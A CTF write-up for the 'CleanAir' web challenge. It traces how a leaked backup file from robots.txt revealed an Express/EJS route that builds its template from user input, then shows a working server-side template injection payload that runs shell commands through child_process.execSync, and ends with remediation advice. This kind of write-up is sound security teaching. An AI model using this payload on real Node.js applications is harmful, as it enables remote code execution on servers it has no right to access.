# CTF Writeup: CleanAir (HACKDAY{...})

## 📝 Challenge Overview
- **Name**: CleanAir
- **Category**: Web / Exploitation
- **Difficulty**: Medium
- **Goal**: Hijack the activist site and find the "bomb" (the flag).

---

## 🔍 Phase 1: Reconnaissance

The initial landing page `http://clean-air.hackday.fr:8000/` presented a standard "CleanAir Community" portal with Login and Register functionality.

### 1. Common Route Discovery
Checking for standard sensitive files lead to an immediate discovery in `/robots.txt`:

```text
User-agent: *
Disallow: /backup/poster_func.bak
```

### 2. Source Code Leakage
Navigating to `/backup/poster_func.bak` returned the JavaScript source code for the `/poster` route. This was the "smoking gun" for understanding the backend logic.

#### Analyzed Source Code Snippet:
```javascript
app.get("/poster", requireLogin, (req,res)=>{
  // ... (setup code)
  let template = `
    <div class="poster-container">
      <h1>${req.session.userSettings.posterTitle}</h1>
      <p>Status: ${req.session.userSettings.status}</p>
      <p>Join our community event to promote cleaner air and a healthier planet.</p>
      <p>Welcome ${req.session.userSettings.randomName}!</p>
    </div>
  `
  let html = ejs.render(template,{settings:req.session.userSettings})
  res.send(html)
})
```

---

## 💡 Phase 2: Vulnerability Analysis

### The Flaw: Server-Side Template Injection (SSTI)
The code uses **EJS (Embedded JavaScript templates)**, but it handles them dangerously. 

1.  **Template Literal Interpolation**: The variable `req.session.userSettings.randomName` is placed into the `template` string using standard JavaScript backticks (template literals) *before* the template is passed to the renderer.
2.  **Delayed Rendering**: When `ejs.render(template, ...)` is called, it processes the *already interpolated* string. If `randomName` contains EJS tags like `<%= ... %>`, the EJS engine will treat them as code and execute them on the server.

This is a classic SSTI scenario where the "template" itself is dynamically constructed from user-controlled input.

---

## 🚀 Phase 3: Exploitation

### 1. Account Initialization
We registered a new account (`verifytest123`) to gain access to the user settings dashboard.

### 2. Payload Crafting
To achieve Remote Code Execution (RCE) via EJS, we need to access the `child_process` module to run system commands. Since EJS runs in a Node.js environment, we can use the `global` object.

**Payload:**
```ejs
<%= global.process.mainModule.require("child_process").execSync("cat /app/flag.txt").toString() %>
```

### 3. Execution Flow
1. **Change Settings**: Inject the payload into the field corresponding to `randomName`.
2. **Trigger**: Navigate to `http://clean-air.hackday.fr:8000/poster`.
3. **Execution**: The server interpolates our payload into the template and then executes it via `ejs.render()`.

---

## 🚩 Phase 4: Flag Extraction

The result was a successfully rendered page containing the flag in the "Welcome" message.

> **Welcome HACKDAY{Y0u_Fuck1ng_P0lluted_Th3_Pl4net}!**

---

## 🛡️ Remediation
To fix this vulnerability, the developers should:
1. **Never** use template literals to construct EJS templates.
2. Use EJS properly by passing user data as variables in the data object:
   ```javascript
   // SECURE WAY
   let templateContent = fs.readFileSync('poster.ejs', 'utf-8');
   res.render('poster', { randomName: req.session.userSettings.randomName });
   ```
3. Sanitize user input to remove template delimiters (`<%`, `%>`).

---

**Final Flag**: `HACKDAY{Y0u_Fuck1ng_P0lluted_Th3_Pl4net}`
